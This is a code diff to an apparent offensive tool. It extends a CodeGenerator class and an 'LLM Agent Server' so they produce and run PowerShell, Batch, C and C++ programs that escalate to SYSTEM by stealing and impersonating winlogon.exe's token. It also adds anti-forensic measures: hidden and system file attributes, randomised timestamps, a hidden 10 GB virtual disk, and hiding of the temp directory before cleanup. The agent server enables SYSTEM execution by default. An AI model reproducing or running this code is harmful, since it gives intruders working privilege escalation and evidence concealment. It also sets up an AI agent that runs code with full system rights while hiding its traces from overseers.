+                code_lines.append("            [DllImport(\"advapi32.dll\", SetLastError = true)]")
+                code_lines.append("            public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);")
+                code_lines.append("            [DllImport(\"advapi32.dll\", SetLastError = true)]")
+                code_lines.append("            public static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);")
+                code_lines.append("            [DllImport(\"kernel32.dll\")]")
+                code_lines.append("            public static extern IntPtr GetCurrentThread();")
+                code_lines.append("        }")
+                code_lines.append("\"@")
+                code_lines.append("        ")
+                code_lines.append("        # Find winlogon.exe process (runs as SYSTEM)")
+                code_lines.append("        $winlogon = Get-Process -Name winlogon -ErrorAction SilentlyContinue")
+                code_lines.append("        if (-not $winlogon) {")
+                code_lines.append("            Write-Warning 'winlogon process not found'")
+                code_lines.append("            return $false")
+                code_lines.append("        }")
+                code_lines.append("        ")
+                code_lines.append("        # Open process handle")
+                code_lines.append("        $hProcess = [System.Diagnostics.Process]::GetProcessById($winlogon.Id).Handle")
+                code_lines.append("        ")
+                code_lines.append("        # Open process token")
+                code_lines.append("        $TOKEN_DUPLICATE = 0x0002")
+                code_lines.append("        $TOKEN_IMPERSONATE = 0x0004")
+                code_lines.append("        $hToken = [IntPtr]::Zero")
+                code_lines.append("        ")
+                code_lines.append("        if ([TokenManipulation]::OpenProcessToken($hProcess, $TOKEN_DUPLICATE -bor $TOKEN_IMPERSONATE, [ref]$hToken)) {")
+                code_lines.append("            # Duplicate token")
+                code_lines.append("            $SECURITY_IMPERSONATION_LEVEL_Impersonation = 2")
+                code_lines.append("            $TOKEN_TYPE_Impersonation = 2")
+                code_lines.append("            $hDupToken = [IntPtr]::Zero")
+                code_lines.append("            ")
+                code_lines.append("            if ([TokenManipulation]::DuplicateTokenEx($hToken, 0x1F0FFF, [IntPtr]::Zero, $SECURITY_IMPERSONATION_LEVEL_Impersonation, $TOKEN_TYPE_Impersonation, [ref]$hDupToken)) {")
+                code_lines.append("                # Impersonate token")
+                code_lines.append("                $hThread = [TokenManipulation]::GetCurrentThread()")
+                code_lines.append("                if ([TokenManipulation]::SetThreadToken($hThread, $hDupToken)) {")
+                code_lines.append("                    Write-Host 'Successfully escalated to SYSTEM privileges'")
+                code_lines.append("                    return $true")
+                code_lines.append("                }")
+                code_lines.append("            }")
+                code_lines.append("        }")
+                code_lines.append("        ")
+                code_lines.append("        Write-Warning 'Token manipulation failed'")
+                code_lines.append("        return $false")
+                code_lines.append("    } catch {")
+                code_lines.append("        Write-Warning \"Token manipulation error: $_\"")
+                code_lines.append("        return $false")
+                code_lines.append("    }")
+                code_lines.append("}")
+                code_lines.append("")
+        
+        # Add helper function to pass SYSTEM token to subprocesses
+        if system_privilege:
+            code_lines.append("")
+            code_lines.append("function Start-ProcessWithSystemToken {")
+            code_lines.append("    <#")
+            code_lines.append("    Start a process with SYSTEM token inheritance")
+            code_lines.append("    #>")
+            code_lines.append("    param(")
+            code_lines.append("        [Parameter(Mandatory=$true)]")
+            code_lines.append("        [string]$FilePath,")
+            code_lines.append("        ")
+            code_lines.append("        [Parameter(Mandatory=$false)]")
+            code_lines.append("        [string[]]$ArgumentList = @(),")
+            code_lines.append("        ")
+            code_lines.append("        [Parameter(Mandatory=$false)]")
+            code_lines.append("        [switch]$InheritToken")
+            code_lines.append("    )")
+            code_lines.append("    ")
+            code_lines.append("    # Verify SYSTEM token is available")
+            code_lines.append("    if (-not (Test-PE5SystemToken)) {")
+            code_lines.append("        Write-Warning 'SYSTEM token not available for subprocess'")
+            code_lines.append("        return $null")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    # Start process - token will be inherited automatically")
+            code_lines.append("    # On Windows, child processes inherit the parent's token")
+            code_lines.append("    $proc = Start-Process -FilePath $FilePath `")
+            code_lines.append("        -ArgumentList $ArgumentList `")
+            code_lines.append("        -NoNewWindow `")
+            code_lines.append("        -PassThru")
+            code_lines.append("    ")
+            code_lines.append("    if ($proc) {")
+            code_lines.append("        Write-Host \"Started process $($proc.Id) with SYSTEM token inheritance\"")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    return $proc")
+            code_lines.append("}")
+        
+        code_lines.append("")
         code_lines.append("function Main {")
         code_lines.append(f"    <# {description} #>")
+        if system_privilege:
+            code_lines.append("    # Check SYSTEM token using PE5 method")
+            code_lines.append("    if (-not (Test-PE5SystemToken)) {")
+            code_lines.append("        Write-Warning 'SYSTEM token not detected, attempting escalation...'")
+            code_lines.append("        if (-not (Invoke-TokenManipulation)) {")
+            code_lines.append("            Write-Warning 'Continuing without SYSTEM privileges'")
+            code_lines.append("            return 1")
+            code_lines.append("        }")
+            code_lines.append("    } else {")
+            code_lines.append("        Write-Host 'SYSTEM token verified via PE5 check'")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    # Store SYSTEM token state for subprocess inheritance")
+            code_lines.append("    $env:SYSTEM_TOKEN_ACQUIRED = '1'")
+            code_lines.append("    ")
+            code_lines.append("    # TODO: Implement functionality")
+            code_lines.append("    # Note: Any subprocesses created will inherit SYSTEM token automatically")
+            code_lines.append("    # Use Start-ProcessWithSystemToken helper for explicit token passing")
         code_lines.append("    Write-Host 'Generated PowerShell script executed'")
         code_lines.append("    return 0")
         code_lines.append("}")
@@ -214,13 +963,15 @@ class CodeGenerator:
         
         return '\n'.join(code_lines)
     
-    def _generate_batch(self, description: str, requirements: list, imports: list) -> str:
-        """Generate Batch script"""
+    def _generate_batch(self, description: str, requirements: list, imports: list, system_privilege: bool = False) -> str:
+        """Generate enhanced Batch script with SYSTEM privilege support"""
         code_lines = []
         
         code_lines.append("@echo off")
         code_lines.append(f"REM Generated Batch script")
         code_lines.append(f"REM Description: {description}")
+        if system_privilege:
+            code_lines.append("REM Privilege: SYSTEM")
         code_lines.append("")
         
         if requirements:
@@ -229,45 +980,507 @@ class CodeGenerator:
                 code_lines.append(f"REM - {req}")
             code_lines.append("")
         
+        if system_privilege:
+            code_lines.append("REM Attempt to run with SYSTEM privileges")
+            code_lines.append("net session >nul 2>&1")
+            code_lines.append("if %errorLevel% neq 0 (")
+            code_lines.append("    echo Requesting administrator privileges...")
+            code_lines.append("    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"")
+            code_lines.append("    exit /b")
+            code_lines.append(")")
+            code_lines.append("")
+            code_lines.append("REM Verify SYSTEM token via PowerShell")
+            code_lines.append("powershell -Command \"$token = [System.Security.Principal.WindowsIdentity]::GetCurrent(); $isSystem = ($token.User.Value -eq 'S-1-5-18'); if (-not $isSystem) { Write-Warning 'SYSTEM token not detected'; exit 1 }\"")
+            code_lines.append("if %errorLevel% neq 0 (")
+            code_lines.append("    echo Warning: SYSTEM token not available")
+            code_lines.append(")")
+            code_lines.append("")
+            code_lines.append("REM Set environment variable to indicate SYSTEM token is available")
+            code_lines.append("set SYSTEM_TOKEN_ACQUIRED=1")
+            code_lines.append("")
+            code_lines.append("REM Note: Any subprocesses created will inherit SYSTEM token automatically")
+            code_lines.append("REM Use 'start' command to create child processes with token inheritance")
+        
         code_lines.append("echo Generated Batch script executed")
         code_lines.append("exit /b 0")
         
         return '\n'.join(code_lines)
     
-    def execute_code(self, file_path: str, language: str, args: list = None) -> Tuple[int, str, str]:
+    def _generate_c(self, description: str, requirements: list, imports: list, 
+                   system_privilege: bool = False, exploit_type: str = 'token_manipulation') -> str:
+        """Generate C code with SYSTEM privilege escalation"""
+        code_lines = []
+        
+        code_lines.append("/* Generated C code */")
+        code_lines.append(f"/* Description: {description} */")
+        if system_privilege:
+            code_lines.append("/* Privilege: SYSTEM (via token manipulation) */")
+        code_lines.append("")
+        
+        code_lines.append("#include <windows.h>")
+        code_lines.append("#include <stdio.h>")
+        code_lines.append("#include <time.h>")
+        if system_privilege:
+            code_lines.append("#include <psapi.h>")
+        code_lines.append("")
+        
+        # Add anti-forensic utilities for C
+        if system_privilege:
+            code_lines.append("BOOL ApplyAntiForensicsToFile(LPCSTR filePath) {")
+            code_lines.append("    // Set file attributes (hidden + system)")
+            code_lines.append("    DWORD attributes = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;")
+            code_lines.append("    if (!SetFileAttributesA(filePath, attributes)) {")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Randomize timestamps")
+            code_lines.append("    HANDLE hFile = CreateFileA(filePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,")
+            code_lines.append("        NULL, OPEN_EXISTING, 0, NULL);")
+            code_lines.append("    if (hFile == INVALID_HANDLE_VALUE) {")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Generate random timestamps")
+            code_lines.append("    SYSTEMTIME st;")
+            code_lines.append("    GetSystemTime(&st);")
+            code_lines.append("    st.wDay -= (rand() % 30) + 1;")
+            code_lines.append("    st.wMonth -= (rand() % 12);")
+            code_lines.append("    ")
+            code_lines.append("    FILETIME ft;")
+            code_lines.append("    SystemTimeToFileTime(&st, &ft);")
+            code_lines.append("    SetFileTime(hFile, &ft, &ft, &ft);")
+            code_lines.append("    ")
+            code_lines.append("    CloseHandle(hFile);")
+            code_lines.append("    return TRUE;")
+            code_lines.append("}")
+            code_lines.append("")
+        
+        if system_privilege and exploit_type == 'token_manipulation':
+            code_lines.append("BOOL EscalateToSystem() {")
+            code_lines.append("    HANDLE hToken = NULL;")
+            code_lines.append("    HANDLE hDupToken = NULL;")
+            code_lines.append("    HANDLE hProcess = NULL;")
+            code_lines.append("    DWORD dwProcessId = 0;")
+            code_lines.append("    ")
+            code_lines.append("    // Find winlogon.exe (runs as SYSTEM)")
+            code_lines.append("    DWORD processes[1024], cbNeeded;")
+            code_lines.append("    if (!EnumProcesses(processes, sizeof(processes), &cbNeeded))")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    ")
+            code_lines.append("    int numProcesses = cbNeeded / sizeof(DWORD);")
+            code_lines.append("    for (int i = 0; i < numProcesses; i++) {")
+            code_lines.append("        if (processes[i] != 0) {")
+            code_lines.append("            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, processes[i]);")
+            code_lines.append("            if (hProcess) {")
+            code_lines.append("                char processName[MAX_PATH];")
+            code_lines.append("                HMODULE hMod;")
+            code_lines.append("                DWORD cbNeededMod;")
+            code_lines.append("                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededMod)) {")
+            code_lines.append("                    GetModuleBaseName(hProcess, hMod, processName, sizeof(processName));")
+            code_lines.append("                    if (_stricmp(processName, \"winlogon.exe\") == 0) {")
+            code_lines.append("                        dwProcessId = processes[i];")
+            code_lines.append("                        break;")
+            code_lines.append("                    }")
+            code_lines.append("                }")
+            code_lines.append("                CloseHandle(hProcess);")
+            code_lines.append("            }")
+            code_lines.append("        }")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    if (dwProcessId == 0) return FALSE;")
+            code_lines.append("    ")
+            code_lines.append("    // Open process token")
+            code_lines.append("    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);")
+            code_lines.append("    if (!hProcess) return FALSE;")
+            code_lines.append("    ")
+            code_lines.append("    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {")
+            code_lines.append("        CloseHandle(hProcess);")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Duplicate token")
+            code_lines.append("    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {")
+            code_lines.append("        CloseHandle(hToken);")
+            code_lines.append("        CloseHandle(hProcess);")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Impersonate token")
+            code_lines.append("    if (!SetThreadToken(NULL, hDupToken)) {")
+            code_lines.append("        CloseHandle(hDupToken);")
+            code_lines.append("        CloseHandle(hToken);")
+            code_lines.append("        CloseHandle(hProcess);")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    CloseHandle(hDupToken);")
+            code_lines.append("    CloseHandle(hToken);")
+            code_lines.append("    CloseHandle(hProcess);")
+            code_lines.append("    return TRUE;")
+            code_lines.append("}")
+            code_lines.append("")
+        
+        code_lines.append("BOOL CheckSystemTokenPE5() {")
+        code_lines.append("    // PE5 SYSTEM token check using existing verification method")
+        code_lines.append("    // Checks user SID for S-1-5-18 (SYSTEM)")
+        code_lines.append("    HANDLE hToken = NULL;")
+        code_lines.append("    DWORD dwLength = 0;")
+        code_lines.append("    PTOKEN_USER pTokenUser = NULL;")
+        code_lines.append("    ")
+        code_lines.append("    // Open process token")
+        code_lines.append("    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))")
+        code_lines.append("        return FALSE;")
+        code_lines.append("    ")
+        code_lines.append("    // Get token user (SID)")
+        code_lines.append("    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength)) {")
+        code_lines.append("        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {")
+        code_lines.append("            CloseHandle(hToken);")
+        code_lines.append("            return FALSE;")
+        code_lines.append("        }")
+        code_lines.append("    }")
+        code_lines.append("    ")
+        code_lines.append("    pTokenUser = (PTOKEN_USER)malloc(dwLength);")
+        code_lines.append("    if (!pTokenUser) {")
+        code_lines.append("        CloseHandle(hToken);")
+        code_lines.append("        return FALSE;")
+        code_lines.append("    }")
+        code_lines.append("    ")
+        code_lines.append("    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength)) {")
+        code_lines.append("        // Check if SID is SYSTEM (S-1-5-18)")
+        code_lines.append("        // SYSTEM SID: S-1-5-18")
+        code_lines.append("        // SubAuthority[0] = 5, SubAuthority[1] = 18")
+        code_lines.append("        PSID sid = pTokenUser->User.Sid;")
+        code_lines.append("        if (IsValidSid(sid)) {")
+        code_lines.append("            DWORD subAuthCount = *GetSidSubAuthorityCount(sid);")
+        code_lines.append("            if (subAuthCount >= 2) {")
+        code_lines.append("                DWORD auth5 = *GetSidSubAuthority(sid, 0);  // Should be 5")
+        code_lines.append("                DWORD auth18 = *GetSidSubAuthority(sid, 1); // Should be 18")
+        code_lines.append("                if (auth5 == 5 && auth18 == 18) {")
+        code_lines.append("                    free(pTokenUser);")
+        code_lines.append("                    CloseHandle(hToken);")
+        code_lines.append("                    return TRUE;  // SYSTEM token")
+        code_lines.append("                }")
+        code_lines.append("            }")
+        code_lines.append("        }")
+        code_lines.append("    }")
+        code_lines.append("    ")
+        code_lines.append("    free(pTokenUser);")
+        code_lines.append("    CloseHandle(hToken);")
+        code_lines.append("    return FALSE;")
+        code_lines.append("}")
+        code_lines.append("")
+        # Add helper function to create process with SYSTEM token
+        if system_privilege:
+            code_lines.append("")
+            code_lines.append("BOOL CreateProcessWithSystemToken(LPCSTR lpCommandLine) {")
+            code_lines.append("    // Verify SYSTEM token is available")
+            code_lines.append("    if (!CheckSystemTokenPE5()) {")
+            code_lines.append("        printf(\"Warning: SYSTEM token not available for subprocess\\n\");")
+            code_lines.append("        return FALSE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Create process - token will be inherited automatically")
+            code_lines.append("    // On Windows, child processes inherit the parent's token")
+            code_lines.append("    STARTUPINFOA si = {0};")
+            code_lines.append("    PROCESS_INFORMATION pi = {0};")
+            code_lines.append("    si.cb = sizeof(si);")
+            code_lines.append("    ")
+            code_lines.append("    // Create process with inherited token")
+            code_lines.append("    if (CreateProcessA(NULL, (LPSTR)lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {")
+            code_lines.append("        printf(\"Created process %lu with SYSTEM token inheritance\\n\", pi.dwProcessId);")
+            code_lines.append("        CloseHandle(pi.hProcess);")
+            code_lines.append("        CloseHandle(pi.hThread);")
+            code_lines.append("        return TRUE;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    return FALSE;")
+            code_lines.append("}")
+        
+        code_lines.append("")
+        code_lines.append("int main() {")
+        code_lines.append(f"    /* {description} */")
+        if system_privilege:
+            code_lines.append("    // Check SYSTEM token using PE5 method")
+            code_lines.append("    if (!CheckSystemTokenPE5()) {")
+            code_lines.append("        printf(\"SYSTEM token not detected, attempting escalation...\\n\");")
+            code_lines.append("        if (!EscalateToSystem()) {")
+            code_lines.append("            printf(\"Error: Could not escalate to SYSTEM\\n\");")
+            code_lines.append("            return 1;")
+            code_lines.append("        }")
+            code_lines.append("    } else {")
+            code_lines.append("        printf(\"SYSTEM token verified via PE5 check\\n\");")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Set environment variable to indicate SYSTEM token is available")
+            code_lines.append("    SetEnvironmentVariableA(\"SYSTEM_TOKEN_ACQUIRED\", \"1\");")
+            code_lines.append("    ")
+            code_lines.append("    // TODO: Implement functionality")
+            code_lines.append("    // Note: Any subprocesses created will inherit SYSTEM token automatically")
+            code_lines.append("    // Use CreateProcessWithSystemToken() helper for explicit token passing")
+        code_lines.append("    printf(\"Generated code executed\\n\");")
+        code_lines.append("    return 0;")
+        code_lines.append("}")
+        
+        return '\n'.join(code_lines)
+    
+    def _generate_cpp(self, description: str, requirements: list, imports: list,
+                     system_privilege: bool = False, exploit_type: str = 'token_manipulation') -> str:
+        """Generate C++ code with SYSTEM privilege escalation"""
+        code_lines = []
+        
+        code_lines.append("/* Generated C++ code */")
+        code_lines.append(f"/* Description: {description} */")
+        if system_privilege:
+            code_lines.append("/* Privilege: SYSTEM (via token manipulation) */")
+        code_lines.append("")
+        
+        code_lines.append("#include <iostream>")
+        code_lines.append("#include <windows.h>")
+        code_lines.append("#include <winternl.h>")
+        code_lines.append("#include <processthreadsapi.h>")
+        code_lines.append("#include <cstring>")
+        if system_privilege:
+            code_lines.append("#include <psapi.h>")
+        code_lines.append("")
+        
+        # Copy escalation and check functions from C version
+        c_code = self._generate_c(description, requirements, imports, system_privilege, exploit_type)
+        # Extract helper functions
+        if system_privilege:
+            # Add C++ version of CreateProcessWithSystemToken
+            code_lines.append("bool CreateProcessWithSystemToken(const std::string& commandLine) {")
+            code_lines.append("    // Verify SYSTEM token is available")
+            code_lines.append("    if (!CheckSystemTokenPE5()) {")
+            code_lines.append("        std::cerr << \"Warning: SYSTEM token not available for subprocess\" << std::endl;")
+            code_lines.append("        return false;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    // Create process - token will be inherited automatically")
+            code_lines.append("    // On Windows, child processes inherit the parent's token")
+            code_lines.append("    STARTUPINFOA si = {0};")
+            code_lines.append("    PROCESS_INFORMATION pi = {0};")
+            code_lines.append("    si.cb = sizeof(si);")
+            code_lines.append("    ")
+            code_lines.append("    // Create process with inherited token")
+            code_lines.append("    char* cmdLine = new char[commandLine.length() + 1];")
+            code_lines.append("    strcpy_s(cmdLine, commandLine.length() + 1, commandLine.c_str());")
+            code_lines.append("    ")
+            code_lines.append("    if (CreateProcessA(nullptr, cmdLine, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi)) {")
+            code_lines.append("        std::cout << \"Created process \" << pi.dwProcessId << \" with SYSTEM token inheritance\" << std::endl;")
+            code_lines.append("        CloseHandle(pi.hProcess);")
+            code_lines.append("        CloseHandle(pi.hThread);")
+            code_lines.append("        delete[] cmdLine;")
+            code_lines.append("        return true;")
+            code_lines.append("    }")
+            code_lines.append("    ")
+            code_lines.append("    delete[] cmdLine;")
+            code_lines.append("    return false;")
+            code_lines.append("}")
+            code_lines.append("")
+        
+        # Convert C code to C++ and extract main
+        cpp_code = c_code.replace("#include <stdio.h>", "")
+        cpp_code = cpp_code.replace("printf", "std::cout <<")
+        cpp_code = cpp_code.replace("/* Generated C code */", "")
+        cpp_code = cpp_code.replace("\\n\");", " << std::endl;")
+        
+        # Extract main function and convert
+        if "int main()" in cpp_code:
+            main_start = cpp_code.find("int main()")
+            main_end = cpp_code.find("}", main_start)
+            if main_end > 0:
+                main_func = cpp_code[main_start:main_end+1]
+                # Add environment variable setting and comments
+                if system_privilege and "SetEnvironmentVariableA" not in main_func:
+                    main_func = main_func.replace("    printf(\"Generated code executed\\n\");", 
+                        "    // Set environment variable to indicate SYSTEM token is available\n    SetEnvironmentVariableA(\"SYSTEM_TOKEN_ACQUIRED\", \"1\");\n    \n    // TODO: Implement functionality\n    // Note: Any subprocesses created will inherit SYSTEM token automatically\n    // Use CreateProcessWithSystemToken() helper for explicit token passing\n    std::cout << \"Generated code executed\" << std::endl;")
+                code_lines.append(main_func)
+        
+        return '\n'.join(code_lines)
+    
+    def check_system_token_before_execution(self) -> bool:
+        """Check SYSTEM token before code execution using PE5 method"""
+        result = self.check_system_token_pe5()
+        if result.get('has_system'):
+            self.console.print(f"[green]✓ SYSTEM token verified via {result.get('method')}[/green]")
+            return True
+        else:
+            self.console.print(f"[yellow]⚠ SYSTEM token not detected[/yellow]")
+            return False
+    
+    def execute_code(self, file_path: str, language: str, args: list = None, 
+                    system_privilege: bool = None) -> Tuple[int, str, str]:
         """
-        Execute generated code
+        Execute generated code with optional SYSTEM privilege
         
         Args:
             file_path: Path to code file
             language: Language of the code
             args: Additional arguments
+            system_privilege: Override system privilege setting (uses instance default if None)
         
         Returns:
             Tuple of (exit_code, stdout, stderr)
         """
         args = args or []
         lab_use = self.session_data.get('LAB_USE', 0)
+        use_system = system_privilege if system_privilege is not None else self.system_privilege
+        
+        # Ensure SYSTEM token is available before execution if SYSTEM privilege is requested
+        if use_system:
+            if not self.ensure_system_token():
+                self.console.print("[yellow]Warning: SYSTEM token not available, attempting acquisition...[/yellow]")
+                if not self.acquire_system_token():
+                    self.console.print("[red]Error: Could not acquire SYSTEM token, execution may fail[/red]")
+                    return 1, "", "SYSTEM token acquisition failed"
         
         try:
             if language == 'python':
                 cmd = [sys.executable, file_path] + args
-                result = subprocess.run(
-                    cmd,
-                    capture_output=True,
-                    text=True,
-                    timeout=30,
-                    cwd=self.temp_dir
-                )
-                return result.returncode, result.stdout, result.stderr
+                # If SYSTEM privilege needed, run via PowerShell with SYSTEM token inheritance
+                if use_system:
+                    # Ensure SYSTEM token is available
+                    if not self.ensure_system_token():
+                        self.console.print("[red]Error: SYSTEM token not available for execution[/red]")
+                        return 1, "", "SYSTEM token not available"
+                    
+                    # Run with SYSTEM token inheritance
+                    # Use Start-Process with -Verb RunAs and token passing
+                    ps_wrapper = f"""
+                    # Ensure SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    
+                    # Start process with SYSTEM token inheritance
+                    $proc = Start-Process -FilePath '{sys.executable}' `
+                        -ArgumentList '{file_path}', {' '.join([f"'{a}'" for a in args])} `
+                        -NoNewWindow -Wait -PassThru `
+                        -PassThru
+                    exit $proc.ExitCode
+                    """
+                    return execute_powershell(ps_wrapper, lab_use=lab_use)
+                else:
+                    result = subprocess.run(
+                        cmd,
+                        capture_output=True,
+                        text=True,
+                        timeout=30,
+                        cwd=self.temp_dir
+                    )
+                    return result.returncode, result.stdout, result.stderr
             
             elif language == 'powershell':
-                ps_cmd = f"& '{file_path}' {' '.join(args)}"
+                if use_system:
+                    # Ensure SYSTEM token is available
+                    if not self.ensure_system_token():
+                        self.console.print("[red]Error: SYSTEM token not available for execution[/red]")
+                        return 1, "", "SYSTEM token not available"
+                    
+                    # Run with SYSTEM token inheritance
+                    ps_cmd = f"""
+                    # Verify SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    
+                    # Execute script with SYSTEM token (inherited)
+                    & '{file_path}' {' '.join(args)}
+                    """
+                else:
+                    ps_cmd = f"& '{file_path}' {' '.join(args)}"
                 return execute_powershell(ps_cmd, lab_use=lab_use)
             
             elif language == 'batch':
                 cmd = [file_path] + args
-                return execute_cmd(' '.join(cmd), lab_use=lab_use)
+                cmd_str = ' '.join(cmd)
+                if use_system:
+                    # Ensure SYSTEM token is available
+                    if not self.ensure_system_token():
+                        self.console.print("[red]Error: SYSTEM token not available for execution[/red]")
+                        return 1, "", "SYSTEM token not available"
+                    
+                    # Run batch with SYSTEM token inheritance
+                    ps_cmd = f"""
+                    # Verify SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    
+                    # Start cmd.exe with SYSTEM token (inherited)
+                    $proc = Start-Process -FilePath 'cmd.exe' `
+                        -ArgumentList '/c', '{cmd_str}' `
+                        -NoNewWindow -Wait -PassThru
+                    exit $proc.ExitCode
+                    """
+                    return execute_powershell(ps_cmd, lab_use=lab_use)
+                else:
+                    return execute_cmd(cmd_str, lab_use=lab_use)
+            
+            elif language in ['c', 'cpp']:
+                # Compile first, then execute
+                if language == 'c':
+                    compiler = 'gcc'
+                    ext = '.exe'
+                else:
+                    compiler = 'g++'
+                    ext = '.exe'
+                
+                exe_path = file_path.rsplit('.', 1)[0] + ext
+                compile_cmd = [compiler, file_path, '-o', exe_path]
+                
+                compile_result = subprocess.run(
+                    compile_cmd,
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
+                
+                if compile_result.returncode != 0:
+                    return compile_result.returncode, compile_result.stdout, compile_result.stderr
+                
+                # Execute compiled binary
+                if use_system:
+                    # Ensure SYSTEM token is available
+                    if not self.ensure_system_token():
+                        self.console.print("[red]Error: SYSTEM token not available for execution[/red]")
+                        return 1, "", "SYSTEM token not available"
+                    
+                    # Run binary with SYSTEM token inheritance
+                    ps_cmd = f"""
+                    # Verify SYSTEM token is available
+                    $token = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+                    $isSystem = ($token.User.Value -eq 'S-1-5-18')
+                    if (-not $isSystem) {{
+                        Write-Error 'SYSTEM token not available'
+                        exit 1
+                    }}
+                    
+                    # Start binary with SYSTEM token (inherited)
+                    $proc = Start-Process -FilePath '{exe_path}' `
+                        -ArgumentList {' '.join([f"'{a}'" for a in args])} `
+                        -NoNewWindow -Wait -PassThru
+                    exit $proc.ExitCode
+                    """
+                    return execute_powershell(ps_cmd, lab_use=lab_use)
+                else:
+                    result = subprocess.run(
+                        [exe_path] + args,
+                        capture_output=True,
+                        text=True,
+                        timeout=30
+                    )
+                    return result.returncode, result.stdout, result.stderr
             
             else:
                 return 1, "", f"Unsupported language: {language}"
@@ -281,16 +1494,25 @@ class CodeGenerator:
         """Clean up temporary files"""
         import shutil
         try:
+            # Apply anti-forensics before cleanup (if SYSTEM privilege)
+            if self.system_privilege and self.anti_forensics:
+                try:
+                    # Hide temp directory before removal
+                    self.anti_forensics.hide_directory(self.temp_dir)
+                except Exception:
+                    pass
+            
+            # Remove temp directory
             shutil.rmtree(self.temp_dir)
         except Exception:
             pass
 
 
 class LLMAgentServer:
-    """LLM Agent Server - MEMSHADOW MRAC Protocol Implementation"""
+    """LLM Agent Server - MEMSHADOW MRAC Protocol Implementation with Enhanced Code Generation"""
     
     def __init__(self, console: Console, session_data: dict, host: str = 'localhost', port: int = 8888,
-                 session_token: Optional[bytes] = None):
+                 session_token: Optional[bytes] = None, system_privilege: bool = True):
         self.console = console
         self.session_data = session_data
         self.host = host
@@ -298,12 +1520,129 @@ class LLMAgentServer:
         self.session_token = session_token
         self.socket = None
         self.running = False
-        self.code_generator = CodeGenerator(console, session_data)
+        self.code_generator = CodeGenerator(console, session_data, system_privilege=system_privilege)
         self.client_connections = []
         self.nonce_tracker = NonceTracker()
         self.registered_apps: Dict[bytes, Dict[str, Any]] = {}  # app_id -> app info
         self.sequence_num = 0
         self.app_id = uuid.uuid4().bytes  # This server's app_id
+        self.system_privilege = system_privilege  # SYSTEM privilege execution enabled
+        self.pe5_module = PE5SystemEscalationModule()  # Use existing PE5 module for verification
+        self.system_token_acquired = False  # Track SYSTEM token acquisition state
+        
+        # Initialize hidden virtual disk for temporary storage
+        lab_use = self.session_data.get('LAB_USE', 0)
+        if system_privilege:
+            try:
+                self.hidden_vdisk = create_hidden_storage(size_gb=10, lab_use=lab_use)
+                if self.hidden_vdisk:
+                    self.console.print("[green]✓ Hidden virtual disk created and mounted[/green]")
+                    mount_info = self.hidden_vdisk.get_mount_info()
+                    self.console.print(f"[dim]  Mount Path: {mount_info.get('mount_path', 'N/A')}[/dim]")
+                    self.session_data['HIDDEN_VDISK_MOUNT'] = mount_info.get('mount_path')
+                else:
+                    self.console.print("[yellow]⚠ Failed to create hidden virtual disk[/yellow]")
+            except Exception as e:
+                self.console.print(f"[yellow]⚠ Hidden virtual disk creation failed: {e}[/yellow]")
+        
+        # Check and acquire SYSTEM token on initialization if SYSTEM privilege is enabled
+        if system_privilege:
+            token_status = self.code_generator.check_system_token_pe5()
+            if token_status.get('has_system'):
+                self.system_token_acquired = True
+                self.code_generator.system_token_acquired = True
+                self.console.print(f"[green]✓ SYSTEM token verified via {token_status.get('method')}[/green]")
+                if token_status.get('details', {}).get('UserSID'):
+                    self.console.print(f"[dim]  User SID: {token_status['details']['UserSID']}[/dim]")
+                # Store in session data for persistence
